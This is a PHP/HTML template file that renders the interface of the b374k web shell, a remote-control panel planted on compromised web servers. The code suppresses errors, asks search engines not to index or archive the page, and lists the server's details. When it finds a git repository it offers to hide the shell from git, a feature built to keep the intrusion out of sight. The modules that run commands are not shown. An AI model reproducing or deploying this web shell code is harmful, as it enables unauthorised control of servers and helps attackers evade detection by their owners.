<?php
	$error = @ob_get_contents();
	$error_html = (!empty($error))?"<pre class='phpError border'>".str_replace("\n\n", "\n", html_safe($error))."</pre>":"";
	@ob_end_clean();
	error_reporting(0);
	@ini_set('display_errors','0');


?><!doctype html>
<html>
<head>
<title><?php echo $GLOBALS['title']." ".$GLOBALS['ver'];?></title>
<meta charset='utf-8'>
<meta name='robots' content='noindex, nofollow, noarchive'>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0">
<link rel='SHORTCUT ICON' href='<?php echo get_resource('b374k');?>'>
<style type="text/css">
<__CSS__>
#navigation{position:fixed;left:-16px;top:46%;}
#totop,#tobottom,#toggleBasicInfo{background:url('<?php echo get_resource('arrow');?>');width:32px;height:32px;opacity:0.30;margin:18px 0;cursor:pointer;}
#totop:hover,#tobottom:hover{opacity:0.80;}
#toggleBasicInfo{display:none;float:right;margin:0;}
#basicInfoSplitter{display:none;}
#tobottom{-webkit-transform:scaleY(-1);-moz-transform:scaleY(-1);-o-transform:scaleY(-1);transform:scaleY(-1);filter:FlipV;-ms-filter:"FlipV";}
#showinfo{float:right;display:none;}
#logout{float:right;}
.git_alert{font-weight: bold; color:#ef793e; font-size: 16px;}
</style>
</head>
<body>
<!--wrapper start-->
<div id='wrapper'>
	<!--header start-->
	<div id='header'>
		<!--header info start-->
		<div id='headerNav'>
			<span><a onclick="set_cookie('cwd', '');" href='<?php echo get_self(); ?>'><?php echo $GLOBALS['title']." ".$GLOBALS['ver']?></a></span>
			<img onclick='viewfileorfolder();' id='b374k' src='<?php echo get_resource('b374k');?>' />&nbsp;<span id='nav'><?php echo $nav; ?></span>

			<a class='boxclose' id='logout' title='log out'>x</a>
			<a class='boxclose' id='showinfo' title='show info'>v</a>
		</div>
		<!--header info end-->

		<!--menu start-->
		<div id='menu'>
			<?php
				foreach($GLOBALS['module_to_load'] as $k){
					echo "<a class='menuitem' id='menu".$GLOBALS['module'][$k]['id']."' href='#!".$GLOBALS['module'][$k]['id']."'>".$GLOBALS['module'][$k]['title']."</a>";
				}
			?>
		</div>
		<!--menu end-->

	</div>
	<!--header end-->

	<!--content start-->
	<div id='content'>
		<!--server info start-->
		<div id='basicInfo'>
			<div id='toggleBasicInfo'></div>
			<?php
			echo $error_html;
			foreach(get_server_info() as $k=>$v){
				echo "<div>".$v."</div>";
			}

			if(is_git_repo(getcwd())){
				echo "<p class=\"git_alert\">Warning: b374k is running under a git repository!</p>
					  <a href=\"#\"> Click here to hide b374k from git </a>";
			}
			?>
		</div>
		<!--server info end-->

		<?php
			foreach($GLOBALS['module_to_load'] as $k){
				$content = $GLOBALS['module'][$k]['content'];
				echo "<div class='menucontent' id='".$GLOBALS['module'][$k]['id']."'>".$content."</div>";
			}
		?>
	</div>
	<!--content end-->

</div>
<!--wrapper end-->
<div id='navigation'>
	<div id='totop'></div>
	<div id='tobottom'></div>
</div>
<table id="overlay"><tr><td><div id="loading" ondblclick='loading_stop();'></div></td></tr></table>
<form action='<?php echo get_self(); ?>' method='post' id='form' target='_blank'></form>
<!--script start-->
<script type='text/javascript'>
var targeturl = '<?php echo get_self(); ?>';
var module_to_load = '<?php echo implode(",", $GLOBALS['module_to_load']);?>';
var win = <?php echo (is_win())?'true':'false';?>;
var init_shell = true;
<__ZEPTO__>
<__JS__>

<?php
	foreach($GLOBALS['module_to_load'] as $k){
		echo "function ".$GLOBALS['module'][$k]['id']."(){ ".$GLOBALS['module'][$k]['js_ontabselected']." }\n";
	}
?>
</script>
<!--script end-->
</body>
</html><?php die();?>